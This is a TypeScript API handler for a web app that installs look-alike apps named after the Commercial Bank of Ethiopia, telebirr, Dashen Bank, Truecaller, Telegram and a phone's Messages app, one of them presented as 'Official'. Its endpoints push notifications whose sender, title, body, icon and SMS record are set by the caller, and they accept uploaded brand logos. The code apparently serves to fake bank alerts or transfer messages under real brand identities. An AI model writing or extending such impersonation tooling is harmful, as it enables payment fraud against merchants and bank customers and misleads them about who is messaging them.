import fs from 'node:fs';
import path from 'node:path';
import { generateVAPIDKeys, sendNotification, setVapidDetails } from 'web-push';

export const config = {
  api: {
    bodyParser: {
      sizeLimit: '4mb',
    },
  },
};

interface SyncEntry {
  value: string;
  updatedAt: number;
}

type SyncBucket = Record<string, SyncEntry>;

interface SubAppPushSubscriptionRecord {
  subAppId: string;
  endpoint: string;
  expirationTime: number | null;
  keys: {
    p256dh: string;
    auth: string;
  };
  platform: 'ios' | 'android' | 'desktop';
  updatedAt: number;
}

interface CustomAppLogoRecord {
  icon180: string;
  icon192: string;
  icon512: string;
  iconMaskable: string;
  updatedAt: number;
}

interface BridgeStoreData {
  syncBuckets: Record<string, SyncBucket>;
  subAppSubscriptions: Record<string, SubAppPushSubscriptionRecord[]>;
  customLogos?: Record<string, CustomAppLogoRecord>;
  renewalNeeded?: Record<string, boolean>;
  vapid?: {
    publicKey: string;
    privateKey: string;
    subject: string;
  };
}

interface BrandAppManifestSpec {
  id: string;
  name: string;
  short_name: string;
  description: string;
  start_url: string;
  scope: string;
  background_color: string;
  theme_color: string;
  defaultIcon192: string;
  defaultIcon512: string;
  defaultIconMaskable?: string;
}

const BRAND_APP_SPECS: Record<string, BrandAppManifestSpec> = {
  cbe: {
    id: '/',
    name: 'CBE Mobile Banking',
    short_name: 'CBE Mobile',
    description: 'Official Commercial Bank of Ethiopia (CBE) Mobile Banking application.',
    start_url: '/',
    scope: '/',
    background_color: '#ffffff',
    theme_color: '#ffffff',
    defaultIcon192: '/pwa-192x192.png',
    defaultIcon512: '/pwa-512x512.png',
    defaultIconMaskable: '/pwa-maskable-512x512.png',
  },
  sms: {
    id: '/sms/',
    name: 'Messages',
    short_name: 'Messages',
    description: 'Messages — SMS & Bank Alerts',
    start_url: '/sms/',
    scope: '/sms/',
    background_color: '#000000',
    theme_color: '#000000',
    defaultIcon192: '/icons/notif-sms-ios.png',
    defaultIcon512: '/icons/notif-sms-ios-512.png',
  },
  truecaller: {
    id: '/truecaller/',
    name: 'Truecaller',
    short_name: 'Truecaller',
    description: 'Truecaller — Caller ID & Bank SMS Alerts',
    start_url: '/truecaller/',
    scope: '/truecaller/',
    background_color: '#0066FF',
    theme_color: '#0066FF',
    defaultIcon192: '/icons/notif-truecaller.png',
    defaultIcon512: '/icons/notif-truecaller-512.png',
  },
  telebirr: {
    id: '/telebirr/',
    name: 'telebirr',
    short_name: 'telebirr',
    description: 'telebirr Super App — Mobile Money & Transfers',
    start_url: '/telebirr/',
    scope: '/telebirr/',
    background_color: '#ffffff',
    theme_color: '#5cb82e',
    defaultIcon192: '/icons/notif-telebirr.png',
    defaultIcon512: '/icons/notif-telebirr-512.png',
  },
  dashen: {
    id: '/dashen/',
    name: 'DashenBank',
    short_name: 'DashenBank',
    description: 'Dashen Bank Super App',
    start_url: '/dashen/',
    scope: '/dashen/',
    background_color: '#ffffff',
    theme_color: '#1e3a8a',
    defaultIcon192: '/icons/notif-dashen.png',
    defaultIcon512: '/icons/notif-dashen-512.png',
  },
  telegram: {
    id: '/telegram/',
    name: 'Telegram',
    short_name: 'Telegram',
    description: 'Telegram Messenger',
    start_url: '/telegram/',
    scope: '/telegram/',
    background_color: '#ffffff',
    theme_color: '#229ED9',
    defaultIcon192: '/icons/notif-telegram.png',
    defaultIcon512: '/icons/notif-telegram-512.png',
  },
  phone: {
    id: '/phone/',
    name: 'Phone',
    short_name: 'Phone',
    description: 'Phone & USSD (*889#)',
    start_url: '/phone/',
    scope: '/phone/',
    background_color: '#ffffff',
    theme_color: '#16a34a',
    defaultIcon192: '/icons/notif-phone.png',
    defaultIcon512: '/icons/notif-phone-512.png',
  },
};

function isValidPngDataUrl(val: unknown): val is string {
  return (
    typeof val === 'string' &&
    val.startsWith('data:image/png;base64,') &&
    val.length > 64 &&
    val.length < 1_800_000
  );
}

const VALID_SUB_APPS = new Set([
  'sms',
  'truecaller',
  'telebirr',
  'dashen',
  'telegram',
  'phone',
]);

const MAX_KEYS_PER_BUCKET = 25;
const MAX_BUCKETS = 50;
const MAX_SUBS_PER_BUCKET = 24;
const KV_STORE_KEY = 'cbe_subapp_bridge_store_v1';
const LOCAL_STORE_FILE = '/tmp/cbe-subapp-bridge.json';

let memoryStore: BridgeStoreData | null = null;
let lastKvFetchAt = 0;

function getKvConfig(): { url: string; token: string } | null {
  const url = (
    process.env.KV_REST_API_URL ||
    process.env.UPSTASH_REDIS_REST_URL ||
    ''
  ).trim();
  const token = (
    process.env.KV_REST_API_TOKEN ||
    process.env.UPSTASH_REDIS_REST_TOKEN ||
    ''
  ).trim();
  if (!url || !token) return null;
  return { url: url.replace(/\/+$/, ''), token };
}

async function kvGetStore(): Promise<BridgeStoreData | null> {
  const kv = getKvConfig();
  if (!kv) return null;
  try {
    const res = await fetch(`${kv.url}/get/${encodeURIComponent(KV_STORE_KEY)}`, {
      headers: { Authorization: `Bearer ${kv.token}` },
      cache: 'no-store',
    });
    if (!res.ok) return null;
    const json = (await res.json()) as { result?: string | null };
    if (!json || typeof json.result !== 'string' || !json.result) return null;
    const parsed = JSON.parse(json.result) as Partial<BridgeStoreData>;
    return {
      syncBuckets: parsed.syncBuckets && typeof parsed.syncBuckets === 'object' ? parsed.syncBuckets : {},
      subAppSubscriptions:
        parsed.subAppSubscriptions && typeof parsed.subAppSubscriptions === 'object'
          ? parsed.subAppSubscriptions
          : {},
      customLogos:
        parsed.customLogos && typeof parsed.customLogos === 'object' ? parsed.customLogos : {},
      renewalNeeded:
        parsed.renewalNeeded && typeof parsed.renewalNeeded === 'object' ? parsed.renewalNeeded : {},
      vapid: parsed.vapid,
    };
  } catch {
    return null;
  }
}

async function kvSetStore(store: BridgeStoreData): Promise<void> {
  const kv = getKvConfig();
  if (!kv) return;
  try {
    await fetch(`${kv.url}/set/${encodeURIComponent(KV_STORE_KEY)}`, {
      method: 'POST',
      headers: {
        Authorization: `Bearer ${kv.token}`,
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(store),
    });
  } catch {
    // Non-fatal
  }
}

function readLocalStore(): BridgeStoreData {
  if (memoryStore) return memoryStore;
  try {
    if (fs.existsSync(LOCAL_STORE_FILE)) {
      const parsed = JSON.parse(fs.readFileSync(LOCAL_STORE_FILE, 'utf-8')) as Partial<BridgeStoreData>;
      memoryStore = {
        syncBuckets: parsed.syncBuckets && typeof parsed.syncBuckets === 'object' ? parsed.syncBuckets : {},
        subAppSubscriptions:
          parsed.subAppSubscriptions && typeof parsed.subAppSubscriptions === 'object'
            ? parsed.subAppSubscriptions
            : {},
        customLogos:
          parsed.customLogos && typeof parsed.customLogos === 'object' ? parsed.customLogos : {},
        renewalNeeded:
          parsed.renewalNeeded && typeof parsed.renewalNeeded === 'object' ? parsed.renewalNeeded : {},
        vapid: parsed.vapid,
      };
      return memoryStore;
    }
  } catch {
    // Fallback
  }
  memoryStore = { syncBuckets: {}, subAppSubscriptions: {}, customLogos: {}, renewalNeeded: {} };
  return memoryStore;
}

function writeLocalStore(store: BridgeStoreData): void {
  memoryStore = store;
  try {
    const dir = path.dirname(LOCAL_STORE_FILE);
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(LOCAL_STORE_FILE, JSON.stringify(store), 'utf-8');
  } catch {
    // Non-fatal
  }
}

async function loadStore(forceRemote = false): Promise<BridgeStoreData> {
  const kv = getKvConfig();
  if (kv && (forceRemote || !memoryStore || Date.now() - lastKvFetchAt > 1500)) {
    const remote = await kvGetStore();
    lastKvFetchAt = Date.now();
    if (remote) {
      memoryStore = remote;
      return remote;
    }
  }
  return readLocalStore();
}

async function saveStore(store: BridgeStoreData): Promise<void> {
  const bucketKeys = Object.keys(store.syncBuckets);
  if (bucketKeys.length > MAX_BUCKETS) {
    for (const oldKey of bucketKeys.slice(0, bucketKeys.length - MAX_BUCKETS)) {
      delete store.syncBuckets[oldKey];
    }
  }
  writeLocalStore(store);
  await kvSetStore(store);
}

function cleanEnvVal(val?: string): string {
  if (!val) return '';
  let t = val.trim();
  if ((t.startsWith('"') && t.endsWith('"')) || (t.startsWith("'") && t.endsWith("'"))) {
    t = t.slice(1, -1).trim();
  }
  return t;
}

function isValidVapidPublic(key: string): boolean {
  if (!/^[A-Za-z0-9_-]+={0,2}$/.test(key)) return false;
  try {
    const buf = Buffer.from(key, 'base64url');
    return buf.length === 65 && buf[0] === 0x04;
  } catch {
    return false;
  }
}

function isValidVapidPrivate(key: string): boolean {
  if (!/^[A-Za-z0-9_-]+={0,2}$/.test(key)) return false;
  try {
    const buf = Buffer.from(key, 'base64url');
    return buf.length === 32;
  } catch {
    return false;
  }
}

async function resolveVapidPair(): Promise<{
  publicKey: string;
  privateKey: string;
  subject: string;
  source: 'env' | 'kv' | 'ephemeral';
}> {
  const envPub = cleanEnvVal(process.env.VAPID_PUBLIC_KEY);
  const envPriv = cleanEnvVal(process.env.VAPID_PRIVATE_KEY);
  const envSubj = cleanEnvVal(process.env.VAPID_SUBJECT) || 'mailto:notifications@cbemobile.app';

  if (isValidVapidPublic(envPub) && isValidVapidPrivate(envPriv)) {
    return { publicKey: envPub, privateKey: envPriv, subject: envSubj, source: 'env' };
  }

  const store = await loadStore(false);
  if (
    store.vapid?.publicKey &&
    store.vapid?.privateKey &&
    isValidVapidPublic(store.vapid.publicKey) &&
    isValidVapidPrivate(store.vapid.privateKey)
  ) {
    return {
      publicKey: store.vapid.publicKey,
      privateKey: store.vapid.privateKey,
      subject: store.vapid.subject || envSubj,
      source: getKvConfig() ? 'kv' : 'ephemeral',
    };
  }

  const generated = generateVAPIDKeys();
  store.vapid = {
    publicKey: generated.publicKey,
    privateKey: generated.privateKey,
    subject: envSubj,
  };
  await saveStore(store);

  return {
    publicKey: generated.publicKey,
    privateKey: generated.privateKey,
    subject: envSubj,
    source: getKvConfig() ? 'kv' : 'ephemeral',
  };
}

function sanitizeBucketKey(raw: unknown): string {
  const str = String(raw || 'cbe_primary_sync').trim().toLowerCase();
  const clean = str.replace(/[^a-z0-9_-]/g, '').slice(0, 64);
  return clean || 'cbe_primary_sync';
}

function isValidEndpoint(endpoint: unknown): endpoint is string {
  if (typeof endpoint !== 'string') return false;
  const trimmed = endpoint.trim();
  if (trimmed.length < 16 || trimmed.length > 2048) return false;
  try {
    return new URL(trimmed).protocol === 'https:';
  } catch {
    return false;
  }
}

function extractValidSubscriptions(rawList: unknown): Array<{
  endpoint: string;
  expirationTime: number | null;
  keys: { p256dh: string; auth: string };
}> {
  if (!Array.isArray(rawList)) return [];
  const valid: Array<{
    endpoint: string;
    expirationTime: number | null;
    keys: { p256dh: string; auth: string };
  }> = [];
  for (const item of rawList.slice(0, 12)) {
    if (!item || typeof item !== 'object') continue;
    const sub = item as {
      endpoint?: unknown;
      expirationTime?: unknown;
      keys?: { p256dh?: unknown; auth?: unknown };
    };
    if (!isValidEndpoint(sub.endpoint)) continue;
    if (
      typeof sub.keys?.p256dh !== 'string' ||
      sub.keys.p256dh.length < 16 ||
      typeof sub.keys?.auth !== 'string' ||
      sub.keys.auth.length < 8
    ) {
      continue;
    }
    valid.push({
      endpoint: sub.endpoint,
      expirationTime: typeof sub.expirationTime === 'number' ? sub.expirationTime : null,
      keys: {
        p256dh: sub.keys.p256dh,
        auth: sub.keys.auth,
      },
    });
  }
  return valid;
}

export default async function handler(req: any, res: any) {
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

  if (req.method === 'OPTIONS') {
    res.status(204).end();
    return;
  }

  try {
    const rawUrl = String(req.url || '/api/bridge');
    const urlObj = new URL(rawUrl, 'https://localhost');
    const routeParam =
      typeof req.query?.route === 'string' && req.query.route.startsWith('/')
        ? req.query.route
        : urlObj.pathname;
    const pathname = routeParam.split('?')[0].replace(/\/+$/, '');
    const method = String(req.method || 'GET').toUpperCase();

    const query: Record<string, unknown> = {};
    urlObj.searchParams.forEach((v, k) => {
      query[k] = v;
    });
    if (req.query && typeof req.query === 'object') {
      Object.assign(query, req.query);
    }

    let body: Record<string, unknown> = {};
    if (req.body && typeof req.body === 'object') {
      body = req.body as Record<string, unknown>;
    } else if (typeof req.body === 'string' && req.body.trim()) {
      try {
        body = JSON.parse(req.body);
      } catch {
        body = {};
      }
    }

    // 1. GET VAPID Public Key
    if (
      method === 'GET' &&
      (pathname === '/api/subapp/vapid-key' || pathname === '/api/notifications/vapid-public-key')
    ) {
      const vapid = await resolveVapidPair();
      res.status(200).json({
        ok: true,
        publicKey: vapid.publicKey,
        vapidSource: vapid.source,
        persistentStore: Boolean(getKvConfig()),
      });
      return;
    }

    // 2. GET Sync State
    if (method === 'GET' && pathname === '/api/sync/state') {
      const bucketKey = sanitizeBucketKey(query.key);
      const store = await loadStore(true);
      const bucket = store.syncBuckets[bucketKey] || {};
      res.status(200).json({
        ok: true,
        key: bucketKey,
        entries: bucket,
        serverTime: Date.now(),
      });
      return;
    }

    // 3. POST Sync State
    if (method === 'POST' && pathname === '/api/sync/state') {
      const bucketKey = sanitizeBucketKey(body.key);
      const incomingEntries =
        body.entries && typeof body.entries === 'object'
          ? (body.entries as Record<string, SyncEntry>)
          : {};

      const store = await loadStore(true);
      const bucket: SyncBucket = { ...(store.syncBuckets[bucketKey] || {}) };
      const entryKeys = Object.keys(incomingEntries).slice(0, MAX_KEYS_PER_BUCKET);
      for (const storageKey of entryKeys) {
        if (!storageKey || storageKey.length > 80) continue;
        const item = incomingEntries[storageKey];
        if (!item || typeof item.value !== 'string') continue;
        const incomingTs = Number(item.updatedAt || 0);
        const existing = bucket[storageKey];
        if (!existing || incomingTs >= existing.updatedAt) {
          bucket[storageKey] = {
            value: item.value,
            updatedAt: incomingTs > 0 ? incomingTs : Date.now(),
          };
        }
      }
      store.syncBuckets[bucketKey] = bucket;
      await saveStore(store);

      res.status(200).json({
        ok: true,
        key: bucketKey,
        entries: bucket,
        serverTime: Date.now(),
      });
      return;
    }

    // 4. POST Subscribe sub-app
    if (method === 'POST' && pathname === '/api/subapp/subscribe') {
      const bucketKey = sanitizeBucketKey(body.bucketKey || body.key);
      const subAppId = String(body.subAppId || '').trim().toLowerCase();
      if (!VALID_SUB_APPS.has(subAppId)) {
        res.status(400).json({ ok: false, error: 'Invalid subAppId.' });
        return;
      }

      const validSubs = extractValidSubscriptions([body.subscription]);
      if (validSubs.length === 0) {
        res.status(400).json({ ok: false, error: 'Valid HTTPS push subscription with keys is required.' });
        return;
      }
      const sub = validSubs[0];
      const platformRaw = String(body.platform || 'desktop');
      const platform: 'ios' | 'android' | 'desktop' =
        platformRaw === 'ios' || platformRaw === 'android' ? platformRaw : 'desktop';

      const store = await loadStore(true);
      const replaceExisting = body.replaceExisting === true;
      const list = [...(store.subAppSubscriptions[bucketKey] || [])].filter((item) => {
        if (replaceExisting && item.subAppId === subAppId) return false;
        return !(item.subAppId === subAppId && item.endpoint === sub.endpoint);
      });
      list.push({
        subAppId,
        endpoint: sub.endpoint,
        expirationTime: sub.expirationTime,
        keys: sub.keys,
        platform,
        updatedAt: Date.now(),
      });
      store.subAppSubscriptions[bucketKey] = list.slice(-MAX_SUBS_PER_BUCKET);
      if (!store.renewalNeeded) store.renewalNeeded = {};
      store.renewalNeeded[`${bucketKey}:${subAppId}`] = false;
      await saveStore(store);

      const countForSubApp = store.subAppSubscriptions[bucketKey].filter(
        (item) => item.subAppId === subAppId
      ).length;

      res.status(200).json({
        ok: true,
        bucketKey,
        subAppId,
        deviceCount: countForSubApp,
      });
      return;
    }

    // 5. GET Sub-App Status
    if (method === 'GET' && pathname === '/api/subapp/status') {
      const bucketKey = sanitizeBucketKey(query.bucketKey || query.key);
      const subAppFilter = String(query.subAppId || '').trim().toLowerCase();
      const store = await loadStore(true);
      const list = store.subAppSubscriptions[bucketKey] || [];
      const counts: Record<string, number> = {};
      for (const id of VALID_SUB_APPS) {
        counts[id] = list.filter((item) => item.subAppId === id).length;
      }
      const renewalNeeded = subAppFilter
        ? Boolean(store.renewalNeeded?.[`${bucketKey}:${subAppFilter}`])
        : Object.entries(store.renewalNeeded || {}).some(
            ([k, v]) => k.startsWith(`${bucketKey}:`) && v === true
          );
      const vapid = await resolveVapidPair();
      res.status(200).json({
        ok: true,
        bucketKey,
        counts,
        renewalNeeded,
        vapidSource: vapid.source,
        persistentStore: Boolean(getKvConfig()),
      });
      return;
    }

    // 6. POST Push to Sub-App (permanent pairId lookup + stateless fallback + auto-healing latestSubscription)
    if (method === 'POST' && pathname === '/api/subapp/push') {
      const bucketKey = sanitizeBucketKey(body.bucketKey || body.key);
      const subAppId = String(body.subAppId || '').trim().toLowerCase();
      if (!VALID_SUB_APPS.has(subAppId)) {
        res.status(400).json({ ok: false, error: 'Invalid subAppId.' });
        return;
      }

      const store = await loadStore(true);
      const storedAll = store.subAppSubscriptions[bucketKey] || [];
      const storedTargets = storedAll
        .filter((item) => item.subAppId === subAppId)
        .sort((a, b) => Number(b.updatedAt || 0) - Number(a.updatedAt || 0));
      const directTargets = extractValidSubscriptions(body.directSubscriptions);

      const mergedByEndpoint = new Map<
        string,
        { endpoint: string; expirationTime: number | null; keys: { p256dh: string; auth: string } }
      >();
      // Prefer freshest server-stored rotated subscriptions under this permanent pairId first
      for (const t of storedTargets) {
        mergedByEndpoint.set(t.endpoint, {
          endpoint: t.endpoint,
          expirationTime: t.expirationTime,
          keys: t.keys,
        });
      }
      for (const t of directTargets) {
        if (!mergedByEndpoint.has(t.endpoint)) {
          mergedByEndpoint.set(t.endpoint, t);
        }
      }

      const targets = Array.from(mergedByEndpoint.values());
      const smsRecord =
        body.smsRecord && typeof body.smsRecord === 'object' ? body.smsRecord : undefined;

      const payloadObj: Record<string, unknown> = {
        appName: String(body.appName || subAppId),
        title: String(body.title || 'CBE').slice(0, 120),
        body: String(body.body || 'You have a new message.').slice(0, 650),
        icon: typeof body.icon === 'string' ? body.icon : `/icons/notif-${subAppId}.png`,
        badge: typeof body.badge === 'string' ? body.badge : `/icons/notif-${subAppId}.png`,
        androidIcon:
          typeof body.androidIcon === 'string'
            ? body.androidIcon
            : subAppId === 'sms'
              ? '/icons/notif-sms-android-avatar.png'
              : undefined,
        androidBadge:
          typeof body.androidBadge === 'string'
            ? body.androidBadge
            : subAppId === 'sms'
              ? '/icons/badge-sms-android.png'
              : undefined,
        actions:
          Array.isArray(body.actions)
            ? body.actions
            : subAppId === 'sms'
              ? [{ action: 'mark_read', title: 'Mark as read' }]
              : undefined,
        url: typeof body.url === 'string' ? body.url : `/${subAppId}/`,
        tag: typeof body.tag === 'string' ? body.tag : `cbe-subapp-${subAppId}-${Date.now()}`,
        reference: typeof body.reference === 'string' ? body.reference : undefined,
        smsId: typeof body.smsId === 'string' ? body.smsId : undefined,
        category: typeof body.category === 'string' ? body.category : 'subapp',
        view: subAppId,
        timestamp: Date.now(),
      };
      if (smsRecord) {
        payloadObj.smsRecord = smsRecord;
      }
      const payloadJson = JSON.stringify(payloadObj);

      // Helper to queue message under permanent bucketKey so sub-app catches up even if token rotated while closed
      const queuePendingPush = () => {
        if (!store.syncBuckets[bucketKey]) store.syncBuckets[bucketKey] = {};
        const prevRaw = store.syncBuckets[bucketKey]['cbe_pending_push_queue']?.value;
        let queue: unknown[] = [];
        try {
          const parsed = prevRaw ? JSON.parse(prevRaw) : [];
          if (Array.isArray(parsed)) queue = parsed;
        } catch {}
        queue.push(payloadObj);
        store.syncBuckets[bucketKey]['cbe_pending_push_queue'] = {
          value: JSON.stringify(queue.slice(-20)),
          updatedAt: Date.now(),
        };
      };

      if (targets.length === 0) {
        queuePendingPush();
        if (!store.renewalNeeded) store.renewalNeeded = {};
        store.renewalNeeded[`${bucketKey}:${subAppId}`] = true;
        await saveStore(store);
        res.status(200).json({
          ok: true,
          delivered: 0,
          total: 0,
          failed: 0,
          queued: true,
          renewalRequested: true,
          reason: 'no_subapp_subscription',
        });
        return;
      }

      const vapid = await resolveVapidPair();
      setVapidDetails(vapid.subject, vapid.publicKey, vapid.privateKey);

      let delivered = 0;
      let failed = 0;
      const expiredEndpoints = new Set<string>();
      const errorCodes: number[] = [];
      let latestSubscription: {
        endpoint: string;
        expirationTime: number | null;
        keys: { p256dh: string; auth: string };
      } | null = null;

      await Promise.all(
        targets.map(async (target) => {
          try {
            await sendNotification(target, payloadJson, { TTL: 180, urgency: 'high' });
            delivered += 1;
            if (!latestSubscription) {
              latestSubscription = target;
            }
          } catch (err: any) {
            failed += 1;
            const statusCode = Number(err?.statusCode || 0);
            if (statusCode) errorCodes.push(statusCode);
            if (statusCode === 404 || statusCode === 410 || statusCode === 403) {
              expiredEndpoints.add(target.endpoint);
            }
          }
        })
      );

      let storeDirty = false;
      if (expiredEndpoints.size > 0 && storedTargets.length > 0) {
        store.subAppSubscriptions[bucketKey] = storedAll.filter(
          (item) => !(item.subAppId === subAppId && expiredEndpoints.has(item.endpoint))
        );
        storeDirty = true;
      }

      if (!store.renewalNeeded) store.renewalNeeded = {};
      if (delivered > 0) {
        if (store.renewalNeeded[`${bucketKey}:${subAppId}`]) {
          store.renewalNeeded[`${bucketKey}:${subAppId}`] = false;
          storeDirty = true;
        }
      } else {
        // Never expire the user's permanent Connection Key — queue message & signal sub-app to auto-renew its token!
        queuePendingPush();
        store.renewalNeeded[`${bucketKey}:${subAppId}`] = true;
        storeDirty = true;
      }

      if (storeDirty) {
        await saveStore(store);
      }

      res.status(200).json({
        ok: true,
        delivered,
        total: targets.length,
        failed,
        queued: delivered === 0,
        renewalRequested: delivered === 0,
        latestSubscription,
        errorCodes,
        expiredEndpoints: Array.from(expiredEndpoints),
        vapidSource: vapid.source,
      });
      return;
    }

    // 7. POST /api/pwa/app-logo — save or reset custom app logo for any app (cbe, sms, truecaller, telebirr, dashen, telegram, phone)
    if (method === 'POST' && pathname === '/api/pwa/app-logo') {
      const appId = String(body.appId || '').trim().toLowerCase();
      if (!BRAND_APP_SPECS[appId]) {
        res.status(400).json({ ok: false, error: 'Invalid appId.' });
        return;
      }

      const store = await loadStore(true);
      if (!store.customLogos) store.customLogos = {};

      if (body.reset === true) {
        delete store.customLogos[appId];
        await saveStore(store);
        res.status(200).json({ ok: true, appId, hasCustom: false, updatedAt: Date.now() });
        return;
      }

      const icon192 = body.icon192;
      const icon512 = body.icon512;
      const iconMaskable = body.iconMaskable;
      const icon180 = isValidPngDataUrl(body.icon180) ? body.icon180 : icon192;

      if (!isValidPngDataUrl(icon192) || !isValidPngDataUrl(icon512) || !isValidPngDataUrl(iconMaskable)) {
        res.status(400).json({ ok: false, error: 'Valid PNG data URLs are required for icon192, icon512, and iconMaskable.' });
        return;
      }

      const updatedAt = Date.now();
      store.customLogos[appId] = {
        icon180: icon180 as string,
        icon192,
        icon512,
        iconMaskable,
        updatedAt,
      };
      await saveStore(store);

      res.status(200).json({
        ok: true,
        appId,
        hasCustom: true,
        updatedAt,
      });
      return;
    }

    // 8. GET /api/pwa/app-logos — list active custom logos across all apps
    if (method === 'GET' && pathname === '/api/pwa/app-logos') {
      const store = await loadStore(true);
      const logos: Record<string, { hasCustom: boolean; updatedAt: number; icon180: string; icon192: string }> = {};
      for (const [id, rec] of Object.entries(store.customLogos || {})) {
        if (BRAND_APP_SPECS[id] && rec?.icon192) {
          logos[id] = {
            hasCustom: true,
            updatedAt: rec.updatedAt || Date.now(),
            icon180: rec.icon180 || rec.icon192,
            icon192: rec.icon192,
          };
        }
      }
      res.status(200).json({ ok: true, logos });
      return;
    }

    // 9. GET /api/pwa/icon?app=<id>&size=180|192|512|maskable — serve raw PNG bytes for WebAPK/PWA install
    if (method === 'GET' && pathname === '/api/pwa/icon') {
      const appId = String(query.app || 'cbe').trim().toLowerCase();
      const size = String(query.size || '192').trim().toLowerCase();
      const spec = BRAND_APP_SPECS[appId];
      if (!spec) {
        res.status(404).end('Unknown app');
        return;
      }

      const store = await loadStore(true);
      const rec = store.customLogos?.[appId];
      const dataUrl =
        size === 'maskable'
          ? rec?.iconMaskable
          : size === '512'
            ? rec?.icon512
            : size === '180'
              ? rec?.icon180 || rec?.icon192
              : rec?.icon192;

      if (dataUrl && dataUrl.includes('base64,')) {
        const b64 = dataUrl.split('base64,')[1];
        const buf = Buffer.from(b64, 'base64');
        res.setHeader('Content-Type', 'image/png');
        res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
        res.status(200).send(buf);
        return;
      }

      const fallbackPath =
        size === 'maskable'
          ? spec.defaultIconMaskable || spec.defaultIcon512
          : size === '512'
            ? spec.defaultIcon512
            : spec.defaultIcon192;
      res.setHeader('Location', fallbackPath);
      res.status(302).end();
      return;
    }

    // 10. GET /api/pwa/manifest?app=<id> — serve dynamic spec-compliant Web App Manifest using custom uploaded logo
    if (method === 'GET' && pathname === '/api/pwa/manifest') {
      const appId = String(query.app || 'cbe').trim().toLowerCase();
      const spec = BRAND_APP_SPECS[appId];
      if (!spec) {
        res.status(404).json({ ok: false, error: 'Unknown app manifest' });
        return;
      }

      const store = await loadStore(true);
      const rec = store.customLogos?.[appId];
      const v = String(query.v || rec?.updatedAt || Date.now());

      const ua = String(req.headers['user-agent'] || '');
      const isIosUa = /iPhone|iPad|iPod/i.test(ua);
      const default192 =
        appId === 'sms' && !isIosUa ? '/icons/notif-sms-android.png' : spec.defaultIcon192;
      const default512 =
        appId === 'sms' && !isIosUa ? '/icons/notif-sms-android-512.png' : spec.defaultIcon512;

      const icons = rec
        ? [
            {
              src: `/api/pwa/icon?app=${appId}&size=192&v=${encodeURIComponent(v)}`,
              sizes: '192x192',
              type: 'image/png',
              purpose: 'any',
            },
            {
              src: `/api/pwa/icon?app=${appId}&size=512&v=${encodeURIComponent(v)}`,
              sizes: '512x512',
              type: 'image/png',
              purpose: 'any',
            },
            {
              src: `/api/pwa/icon?app=${appId}&size=maskable&v=${encodeURIComponent(v)}`,
              sizes: '512x512',
              type: 'image/png',
              purpose: 'maskable',
            },
          ]
        : [
            {
              src: default192,
              sizes: '192x192',
              type: 'image/png',
              purpose: 'any',
            },
            {
              src: default512,
              sizes: '512x512',
              type: 'image/png',
              purpose: 'any',
            },
            {
              src: spec.defaultIconMaskable || default512,
              sizes: '512x512',
              type: 'image/png',
              purpose: 'maskable',
            },
          ];

      const manifest = {
        id: spec.id,
        name: spec.name,
        short_name: spec.short_name,
        description: spec.description,
        start_url: spec.start_url,
        scope: spec.scope,
        display: 'standalone',
        orientation: 'portrait',
        background_color: spec.background_color,
        theme_color: spec.theme_color,
        icons,
      };

      res.setHeader('Content-Type', 'application/manifest+json; charset=utf-8');
      res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
      res.status(200).send(JSON.stringify(manifest, null, 2));
      return;
    }

    res.status(404).json({ ok: false, error: `Unknown bridge route: ${pathname}` });
  } catch (err) {
    console.error('[api/bridge] Error:', err);
    res.status(500).json({
      ok: false,
      error: err instanceof Error ? err.message : 'Bridge error',
    });
  }
}
